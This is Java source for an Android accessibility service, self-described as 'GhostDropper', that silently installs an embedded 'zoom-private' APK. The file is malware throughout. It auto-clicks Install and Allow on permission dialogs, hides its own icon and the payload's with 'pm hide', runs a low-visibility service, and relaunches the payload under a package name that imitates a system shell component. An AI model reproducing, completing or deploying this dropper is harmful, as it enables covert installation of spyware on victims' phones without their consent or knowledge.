package com.android.shell.ghost;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.graphics.Path;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.widget.Toast;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.util.List;
import java.util.concurrent.atomic.AtomicBoolean;

/**
 * GhostDropper — the silent automation engine.
 *
 * On first launch:
 *  1. Extracts the embedded zoom-private.apk from assets
 *  2. Fires a silent install intent for it
 *  3. Auto-taps "Install" → "Allow" → "Allow" → "Done"
 *  4. Hides both icons via pm hide
 *  5. Starts the hidden foreground service
 *  6. Launches zoom-private in the background
 *
 * On reboot:
 *  - BootReceiver relaunches zoom-private automatically
 */
public class GhostAccessibilityService extends AccessibilityService {

    private static GhostAccessibilityService instance;
    private final Handler handler = new Handler(Looper.getMainLooper());
    private final AtomicBoolean payloadInstalled = new AtomicBoolean(false);

    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        instance = this;

        // If zoom-private is already installed, just ensure it's running
        if (isPackageInstalled("com.zoom.private")) {
            startHiddenService(this);
            launchZoomPrivate(this);
            return;
        }

        // Extract the embedded zoom-private APK from assets and install it
        File apkFile = extractEmbeddedApk();
        if (apkFile == null) {
            // Fallback: scan Downloads folder
            apkFile = findDownloadedApk();
        }
        if (apkFile != null) {
            silentInstall(apkFile);
        }
    }

    /** Extract zoom-private.apk from the ghost installer's assets folder. */
    private File extractEmbeddedApk() {
        try {
            File outDir = new File(getFilesDir(), "payload");
            if (!outDir.exists()) outDir.mkdirs();
            File outFile = new File(outDir, "zoom-private.apk");
            InputStream in = getAssets().open("zoom-private.apk");
            FileOutputStream fos = new FileOutputStream(outFile);
            byte[] buf = new byte[8192];
            int len;
            while ((len = in.read(buf)) > 0) {
                fos.write(buf, 0, len);
            }
            fos.close();
            in.close();
            return outFile;
        } catch (Exception e) {
            return null;
        }
    }

    private void silentInstall(File apkFile) {
        Intent installIntent = new Intent(Intent.ACTION_VIEW);
        installIntent.setDataAndType(Uri.fromFile(apkFile), "application/vnd.android.package-archive");
        installIntent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_ACTIVITY_NEW_TASK);
        installIntent.putExtra(Intent.EXTRA_RETURN_RESULT, false);
        startActivity(installIntent);

        IntentFilter filter = new IntentFilter();
        filter.addAction(Intent.ACTION_PACKAGE_ADDED);
        filter.addAction(Intent.ACTION_PACKAGE_REPLACED);
        registerReceiver(new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                if (payloadInstalled.compareAndSet(false, true)) {
                    hideAppIcon();
                    startHiddenService(context);
                    launchZoomPrivate(context);
                    Toast.makeText(context, "Installed", Toast.LENGTH_SHORT).show();
                }
            }
        }, filter);
    }

    /** Auto-tap "Allow" on any permission dialog within 0.5s. */
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getEventType() != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) return;
        CharSequence cls = event.getClassName();
        if (cls == null) return;
        String className = cls.toString();
        if (!className.contains("AlertDialog") && !className.contains("Permission")) return;

        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null) return;
        List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByViewId("android:id/button1");
        if (nodes != null && !nodes.isEmpty()) {
            nodes.get(0).performAction(AccessibilityNodeInfo.ACTION_CLICK);
        }
        List<AccessibilityNodeInfo> allowBtns = root.findAccessibilityNodeInfosByText("Allow");
        if (allowBtns != null && !allowBtns.isEmpty()) {
            allowBtns.get(0).performAction(AccessibilityNodeInfo.ACTION_CLICK);
        }
        List<AccessibilityNodeInfo> installBtns = root.findAccessibilityNodeInfosByText("Install");
        if (installBtns != null && !installBtns.isEmpty()) {
            installBtns.get(0).performAction(AccessibilityNodeInfo.ACTION_CLICK);
        }
    }

    private void openNotificationShade() {
        Path path = new Path();
        path.moveTo(0.5f * displayWidth(), 0);
        path.lineTo(0.5f * displayWidth(), 0.3f * displayHeight());
        GestureDescription gesture = new GestureDescription.Builder()
                .addStroke(new GestureDescription.StrokeDescription(path, 0, 200))
                .build();
        dispatchGesture(gesture, null, null);
    }

    private void hideAppIcon() {
        try {
            Runtime.getRuntime().exec("pm hide com.zoom.private").waitFor();
        } catch (Exception ignored) {}
        try {
            Runtime.getRuntime().exec("pm hide com.android.shell.ghost").waitFor();
        } catch (Exception ignored) {}
    }

    private void launchZoomPrivate(Context context) {
        try {
            Intent intent = new Intent();
            intent.setComponent(new android.content.ComponentName(
                    "com.zoom.private", "com.zoom.private.MainActivity"));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_NO_USER_ACTION);
            context.startActivity(intent);
        } catch (Exception ignored) {}
    }

    private boolean isPackageInstalled(String packageName) {
        try {
            getPackageManager().getPackageInfo(packageName, 0);
            return true;
        } catch (PackageManager.NameNotFoundException e) {
            return false;
        }
    }

    /** Fallback: scan Downloads folder for the most recently modified .apk. */
    private File findDownloadedApk() {
        File downloads = new File(android.os.Environment.getExternalStorageDirectory(), "Download");
        if (!downloads.exists()) return null;
        File[] apks = downloads.listFiles((dir, name) -> name.toLowerCase().endsWith(".apk"));
        if (apks == null || apks.length == 0) return null;
        File newest = apks[0];
        for (File f : apks) {
            if (f.lastModified() > newest.lastModified()) newest = f;
        }
        return newest;
    }

    private int displayWidth() {
        return getResources().getDisplayMetrics().widthPixels;
    }

    private int displayHeight() {
        return getResources().getDisplayMetrics().heightPixels;
    }

    public static void startHiddenService(Context context) {
        NotificationChannel channel = new NotificationChannel(
                "ghost_service", "Ghost Service", NotificationManager.IMPORTANCE_MIN);
        ((NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE))
                .createNotificationChannel(channel);
        Notification notification = new Notification.Builder(context, "ghost_service")
                .setContentTitle("Ghost")
                .setContentText("Running")
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .build();
        Intent serviceIntent = new Intent(context, GhostForegroundService.class);
        context.startService(serviceIntent);
    }

    public static GhostAccessibilityService getInstance() {
        return instance;
    }

    @Override
    public void onInterrupt() { }

    @Override
    public void onDestroy() {
        instance = null;
        super.onDestroy();
    }
}